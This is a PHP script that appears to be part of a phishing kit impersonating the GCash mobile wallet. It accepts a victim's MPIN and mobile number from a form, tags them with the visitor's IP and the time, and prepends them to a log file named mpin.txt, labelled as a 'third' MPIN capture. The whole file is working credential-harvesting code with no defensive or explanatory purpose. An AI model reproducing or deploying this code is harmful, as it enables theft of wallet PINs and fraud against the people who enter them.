<?php

$today = date("H:i:s");
function file_prepend ($string, $filename) {
	
	$fileContent = file_get_contents ($filename);
	
	file_put_contents ($filename, $string . "\n" . $fileContent);
}
include('system.php');
$num = $_GET['mobnumid'];

if ($_POST["mpincode"]) {
    $mpincode = $_POST['mpincode'];
    $replyMsg = "[ <font color='orange'>$ip</font> ] $today | <font color='purple'> 3rd MPIN</font> : <font color='yellow'>$mpincode - $num</font><br>";
    file_prepend($replyMsg, 'mpin.txt');
    http_response_code(200);
    setcookie("gcash_number", "", time()-3600);
}

?>